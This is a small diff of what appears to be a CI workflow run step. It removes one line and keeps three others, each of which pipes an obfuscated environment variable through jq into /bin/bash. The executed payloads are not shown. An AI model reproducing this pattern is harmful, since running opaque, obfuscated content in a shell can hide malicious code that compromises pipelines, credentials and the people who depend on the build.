@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$e358" | jq -r .ccf907 | /bin/bash
           printf '%s' "$gnk2013" | jq -r .h19 | /bin/bash
-          echo $xldzc1 | jq -r .no2 | /bin/bash
           printf '%s' "$cy72" | jq -r .y6929 | /bin/bash
 
       - name: Save results
